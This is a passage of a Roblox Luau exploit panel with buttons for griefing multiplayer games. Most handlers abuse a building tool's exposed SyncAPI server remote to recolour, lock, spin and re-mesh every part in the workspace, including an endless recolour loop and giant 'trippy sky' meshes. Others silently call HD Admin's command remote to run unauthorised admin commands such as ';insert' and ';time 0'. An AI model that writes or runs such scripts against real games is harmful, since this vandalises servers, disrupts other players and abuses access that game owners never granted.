		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		--craaa
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function Vertex(part)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["VertexColor"] = Vector3.new(4,4,4)
					}
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function SpawnDecal(part,side)
			local args = {
				[1] = "CreateTextures",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal"
					}
				}
			}
	
			_(args)
		end
		function AddDecal(part,asset,side)
			local args = {
				[1] = "SyncTexture",
				[2] = {
					[1] = {
						["Part"] = part,
						["Face"] = side,
						["TextureType"] = "Decal",
						["Texture"] = "rbxassetid://".. asset
					}
				}
			}
			_(args)
		end
	
		local spinningParts = {}
	
		game:GetService("RunService").Heartbeat:Connect(function(dt)
			for part,data in pairs(spinningParts) do
				if part and part.Parent then
					data.angleX = data.angleZ + data.speedX * dt
					data.angleY = data.angleY + data.speedZ * dt
					data.angleZ = data.angleX + data.speedY * dt
	
					local cf = CFrame.new(part.Position) * CFrame.Angles(
						math.rad(data.angleX),
						math.rad(data.angleY),
						math.rad(data.angleZ)
					)
	
					MovePart(part, cf)
				else
					spinningParts[part] = nil
				end
			end
		end)
	
	
		function Trp(part)
			local speedX = math.random(22,44)
			local speedY = math.random(22,44)
			local speedZ = math.random(24,24)
			spinningParts[part] = {angleX=0, angleY=0, angleZ=0, speedX=speedX, speedY=speedY, speedZ=speedZ}
			wait(5)
		end
		function TrippySky(textureID)
			local pos = char.Head.Position + Vector3.new(0,6,0)
			CreatePart(CFrame.new(pos), workspace)
			task.wait(0.01)
	
			for _,v in workspace:GetDescendants() do
				if v:IsA("BasePart") and (v.Position - pos).magnitude < 2 then
					SetName(v,"Sky")
					SetTrans(v,0)
					AddMesh(v)
					wait(0.0)
					SetMesh(v,"111891702759441")
					SetTexture(v, textureID)
					wait(0)
					MeshResize(v, Vector3.new(99999,99999,99999))
					Vertex(v)
					SetLocked(v,true)
					Trp(v)
	
				end
			end
		end
	
		TrippySky("121048905438446") --put your decal id if you want..
	
		
		
		
		
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_d);
-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
local function C_f()
local script = G2L["f"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
		-- first you want to know about hd admin remote or shit there silent hd admin command
	
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommandSilent = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommandSilent:InvokeServer(";disco")
	
		--                                                           ^ put a command like ;fly
		--i just have that nga, of you want more dm me at roadblockswashere
	
		
		
		
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_f);
-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
local function C_11()
local script = G2L["11"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
		
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function Material(part,mate)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Material"] = mate
					}
				}
			}
			_(args)
		end
	
		for i,v in game.Workspace:GetDescendants() do
			spawn(function()
				Material(v,Enum.Material.Neon)
			end)
		end
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = workspace.Part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
		function randomise()
			for i,v in game.Workspace:GetDescendants() do
				if v:IsA("BasePart") then
					spawn(function()
						SetLocked(v,false)
						Color(v,Color3.new(1, 1, 1))
					end)
				end
			end
		end
		while wait() do
			spawn(function()
				randomise()
			end)
		end	
		
		
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_11);
-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
local function C_14()
local script = G2L["14"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
		function SetCollision(part,boolean)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = boolean
					}
				}
			}
			_(args)
		end
		function SetAnchor(boolean,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = boolean
					}
				}
			}
			_(args)
		end
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {
					[1] = part
				}
			}
			_(args)
		end
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
		function SetTexture(part, texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
		function SetName(part, stringg)
			local args = {
				[1] = "SetName",
				[2] = {
					[1] = part
				},
				[3] = stringg
			}
	
			_(args)
		end
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
		function Weld(part1, part2,lead)
			local args = {
				[1] = "CreateWelds",
				[2] = {
					[1] = part1,
					[2] = part2
				},
				[3] = lead
			}
			_(args)
	
		end
		function SetLocked(part,boolean)
			local args = {
				[1] = "SetLocked",
				[2] = {
					[1] = part
				},
				[3] = boolean
			}
			_(args)
		end
		function SetTrans(part,int)
			local args = {
				[1] = "SyncMaterial",
				[2] = {
					[1] = {
						["Part"] = part,
						["Transparency"] = int
					}
				}
			}
			_(args)
		end
		function CreateSpotlight(part)
			local args = {
				[1] = "CreateLights",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight"
					}
				}
			}
			_(args)
		end
		function SyncLighting(part,brightness)
			local args = {
				[1] = "SyncLighting",
				[2] = {
					[1] = {
						["Part"] = part,
						["LightType"] = "SpotLight",
						["Brightness"] = brightness
					}
				}
			}
			_(args)
		end
		function Color(part,color)
			local args = {
				[1] = "SyncColor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Color"] = color --[[Color3]],
						["UnionColoring"] = false
					}
				}
			}
			_(args)
		end
	
	
		function randomise()
			for i,v in game.Workspace:GetDescendants() do
				if v:IsA("BasePart") then
					spawn(function()
						SetLocked(v,false)
						MovePart(v,v.CFrame * CFrame.Angles(math.random(0,1), math.random(0,1), math.random(0,1)))
					end)
				end
			end
		end
		randomise()
		
		
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_14);
-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
local function C_16()
local script = G2L["16"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
		RequestCommand:InvokeServer(";insert 53326")
	
		
		
		
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_16);
-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
local function C_18()
local script = G2L["18"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
	--[[
		WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
	]]
		local ReplicatedStorage = game:GetService("ReplicatedStorage")
		local RequestCommand = ReplicatedStorage:WaitForChild("HDAdminHDClient").Signals.RequestCommandSilent
	
		RequestCommand:InvokeServer(";unfog")
		RequestCommand:InvokeServer(";fogcolor black")
		RequestCommand:InvokeServer(";time 0")
	
	
		local player = game.Players.LocalPlayer
		local char = player.Character
		local tool
		for i,v in player:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
		for i,v in game.ReplicatedStorage:GetDescendants() do
			if v.Name == "SyncAPI" then
				tool = v.Parent
			end
		end
	
		remote = tool.SyncAPI.ServerEndpoint
		function _(args)
			remote:InvokeServer(unpack(args))
		end
	
		function SetCollision(part,bool)
			local args = {
				[1] = "SyncCollision",
				[2] = {
					[1] = {
						["Part"] = part,
						["CanCollide"] = bool
					}
				}
			}
			_(args)
		end
	
		function SetAnchor(bool,part)
			local args = {
				[1] = "SyncAnchor",
				[2] = {
					[1] = {
						["Part"] = part,
						["Anchored"] = bool
					}
				}
			}
			_(args)
		end
	
		function CreatePart(cf,parent)
			local args = {
				[1] = "CreatePart",
				[2] = "Normal",
				[3] = cf,
				[4] = parent
			}
			_(args)
		end
	
		function DestroyPart(part)
			local args = {
				[1] = "Remove",
				[2] = {part}
			}
			_(args)
		end
	
		function MovePart(part,cf)
			local args = {
				[1] = "SyncMove",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf
					}
				}
			}
			_(args)
		end
	
		function Resize(part,size,cf)
			local args = {
				[1] = "SyncResize",
				[2] = {
					[1] = {
						["Part"] = part,
						["CFrame"] = cf,
						["Size"] = size
					}
				}
			}
			_(args)
		end
	
		function AddMesh(part)
			local args = {
				[1] = "CreateMeshes",
				[2] = {
					[1] = {
						["Part"] = part
					}
				}
			}
			_(args)
		end
	
		function SetMesh(part,meshid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["MeshId"] = "rbxassetid://"..meshid
					}
				}
			}
			_(args)
		end
	
		function SetTexture(part,texid)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["TextureId"] = "rbxassetid://"..texid
					}
				}
			}
			_(args)
		end
	
		function SetVertexColor(part,color)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["VertexColor"] = color
					}
				}
			}
			_(args)
		end
	
		function SetName(part,name)
			local args = {
				[1] = "SetName",
				[2] = {part},
				[3] = name
			}
			_(args)
		end
	
		function MeshResize(part,size)
			local args = {
				[1] = "SyncMesh",
				[2] = {
					[1] = {
						["Part"] = part,
						["Scale"] = size
					}
				}
			}
			_(args)
		end
	
		function SetLocked(part,bool)
			local args = {
				[1] = "SetLocked",
				[2] = {part},
				[3] = bool
			}
			_(args)
		end
	
		function Sky(id)
			local root = char.HumanoidRootPart
			local spawnPos = CFrame.new(
				math.floor(root.Position.X),
				math.floor(root.Position.Y),
				math.floor(root.Position.Z)
			) + Vector3.new(0,6,0)
	
			CreatePart(spawnPos,workspace)
			task.wait(0.2)
	
			local skyPart
			for i,v in workspace:GetDescendants() do
				if v:IsA("BasePart") and (v.Position - spawnPos.Position).Magnitude < 1 then
					skyPart = v
	
					SetName(v,"HDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD")
					AddMesh(v)
					SetMesh(v,"111891702759441")
					SetTexture(v,id)
	
	
					SetVertexColor(v, Vector3.new(3,3,3))
	
					MeshResize(v,Vector3.new(3000,3000,3000))
					SetLocked(v,true)
					SetAnchor(true,v)
					SetCollision(v,false)
					break
				end
			end
	
			if skyPart then
				local t = 0
				local baseSpeed = 123
				local randomness = 123
	
				game:GetService("RunService").Heartbeat:Connect(function(dt)
					t = t + dt
					local rotX = math.sin(t * 1.5) * randomness
					local rotY = t * baseSpeed
					local rotZ = math.cos(t * 2.1) * randomness
					local newCf = spawnPos * CFrame.Angles(
						math.rad(rotX),
						math.rad(rotY),
						math.rad(rotZ)
					)
					MovePart(skyPart,newCf)
				end)
			end
		end
	
		Sky("86469911507918")
	
		
		
		
		
	
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	end)
	
end;
task.spawn(C_18);
-- StarterGui.ScreenGui.Frame.ScrollingFrame.TextButton.LocalScript
local function C_1a()
local script = G2L["1a"];
	script.Parent.MouseButton1Click:Connect(function()
		
		
		
	--[=[
	 d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
	88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
	88      88    88    88            odD'      88      88    88 88ooo88 
	88  ooo 88    88    88          .88'        88      88    88 88~~~88 
	88. ~8~ 88b  d88   .88.        j88.         88booo. 88b  d88 88   88    @uniquadev
	 Y888P  ~Y8888P' Y888888P      888888D      Y88888P ~Y8888P' YP   YP  CONVERTER 
	]=]
	
		-- Instances: 28 | Scripts: 3 | Modules: 0 | Tags: 0
		local G2L = {};
	
		-- StarterGui.MainModule.1376962
		G2L["1"] = Instance.new("ScreenGui", game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui"));
		G2L["1"]["Name"] = [[1376962]];
	
	
		-- StarterGui.MainModule.1376962.Frame
		G2L["2"] = Instance.new("Frame", G2L["1"]);
		G2L["2"]["BorderSizePixel"] = 3;
		G2L["2"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["2"]["Size"] = UDim2.new(0, 305, 0, 261);
		G2L["2"]["Position"] = UDim2.new(0.04508, 0, 0.21224, 0);
		G2L["2"]["BorderColor3"] = Color3.fromRGB(255, 255, 0);
	
	
		-- StarterGui.MainModule.1376962.Frame.TextButton
		G2L["3"] = Instance.new("TextButton", G2L["2"]);
		G2L["3"]["BorderSizePixel"] = 3;
		G2L["3"]["TextSize"] = 30;
		G2L["3"]["TextColor3"] = Color3.fromRGB(255, 255, 0);
		G2L["3"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["3"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["3"]["Size"] = UDim2.new(0, 155, 0, 50);
		G2L["3"]["BorderColor3"] = Color3.fromRGB(255, 255, 0);
		G2L["3"]["Text"] = [[Skybox]];
		G2L["3"]["Position"] = UDim2.new(-0.00055, 0, 0.19, 0);
	
	
		-- StarterGui.MainModule.1376962.Frame.TextButton.Script
		G2L["4"] = Instance.new("Script", G2L["3"]);
	
	
	
		-- StarterGui.MainModule.1376962.Frame.TextButton
		G2L["5"] = Instance.new("TextButton", G2L["2"]);
		G2L["5"]["BorderSizePixel"] = 3;
		G2L["5"]["TextSize"] = 30;
		G2L["5"]["TextColor3"] = Color3.fromRGB(255, 255, 0);
		G2L["5"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["5"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["5"]["Size"] = UDim2.new(0, 144, 0, 50);
		G2L["5"]["BorderColor3"] = Color3.fromRGB(255, 255, 0);
		G2L["5"]["Text"] = [[DecalSpam]];
		G2L["5"]["Position"] = UDim2.new(0.52732, 0, 0.19, 0);
	
	
		-- StarterGui.MainModule.1376962.Frame.TextButton.Script
		G2L["6"] = Instance.new("Script", G2L["5"]);
	
	
	
		-- StarterGui.MainModule.1376962.Frame.TextButton
		G2L["7"] = Instance.new("TextButton", G2L["2"]);
		G2L["7"]["BorderSizePixel"] = 3;
		G2L["7"]["TextSize"] = 30;
		G2L["7"]["TextColor3"] = Color3.fromRGB(255, 255, 0);
		G2L["7"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["7"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["7"]["Size"] = UDim2.new(0, 155, 0, 50);
		G2L["7"]["BorderColor3"] = Color3.fromRGB(255, 255, 0);
		G2L["7"]["Text"] = [[Particles]];
		G2L["7"]["Position"] = UDim2.new(-0.00055, 0, 0.40073, 0);
	
	
		-- StarterGui.MainModule.1376962.Frame.TextButton.Script
		G2L["8"] = Instance.new("Script", G2L["7"]);
	
	
	
		-- StarterGui.MainModule.1376962.Frame.TextButton
		G2L["9"] = Instance.new("TextButton", G2L["2"]);
		G2L["9"]["BorderSizePixel"] = 3;
		G2L["9"]["TextSize"] = 30;
		G2L["9"]["TextColor3"] = Color3.fromRGB(255, 255, 0);
		G2L["9"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["9"]["Size"] = UDim2.new(0, 144, 0, 50);
		G2L["9"]["BorderColor3"] = Color3.fromRGB(255, 255, 0);
		G2L["9"]["Text"] = [[Toad Roast]];
		G2L["9"]["Position"] = UDim2.new(0.52732, 0, 0.40073, 0);
	
	
		-- StarterGui.MainModule.1376962.Frame.TextButton.Script
		G2L["a"] = Instance.new("Script", G2L["9"]);
	
	
	
		-- StarterGui.MainModule.1376962.Frame.TextButton
		G2L["b"] = Instance.new("TextButton", G2L["2"]);
		G2L["b"]["BorderSizePixel"] = 3;
		G2L["b"]["TextSize"] = 30;
		G2L["b"]["TextColor3"] = Color3.fromRGB(255, 255, 0);
		G2L["b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["b"]["Size"] = UDim2.new(0, 155, 0, 50);
		G2L["b"]["BorderColor3"] = Color3.fromRGB(255, 255, 0);
		G2L["b"]["Text"] = [[Disco]];
		G2L["b"]["Position"] = UDim2.new(-0.00055, 0, 0.61529, 0);
	
	
		-- StarterGui.MainModule.1376962.Frame.TextButton.Script
		G2L["c"] = Instance.new("Script", G2L["b"]);
	
	
	
		-- StarterGui.MainModule.1376962.Frame.TextButton
		G2L["d"] = Instance.new("TextButton", G2L["2"]);
		G2L["d"]["BorderSizePixel"] = 3;
		G2L["d"]["TextSize"] = 30;
		G2L["d"]["TextColor3"] = Color3.fromRGB(255, 255, 0);
		G2L["d"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["d"]["Size"] = UDim2.new(0, 144, 0, 50);
		G2L["d"]["BorderColor3"] = Color3.fromRGB(255, 255, 0);
		G2L["d"]["Text"] = [[Curse]];
		G2L["d"]["Position"] = UDim2.new(0.52732, 0, 0.61529, 0);
	
	
		-- StarterGui.MainModule.1376962.Frame.TextButton.Script
		G2L["e"] = Instance.new("Script", G2L["d"]);
	
	
	
		-- StarterGui.MainModule.1376962.Frame.TextButton
		G2L["f"] = Instance.new("TextButton", G2L["2"]);
		G2L["f"]["BorderSizePixel"] = 3;
		G2L["f"]["TextSize"] = 30;
		G2L["f"]["TextColor3"] = Color3.fromRGB(255, 255, 0);
		G2L["f"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
		G2L["f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
		G2L["f"]["Size"] = UDim2.new(0, 155, 0, 50);
		G2L["f"]["BorderColor3"] = Color3.fromRGB(255, 255, 0);
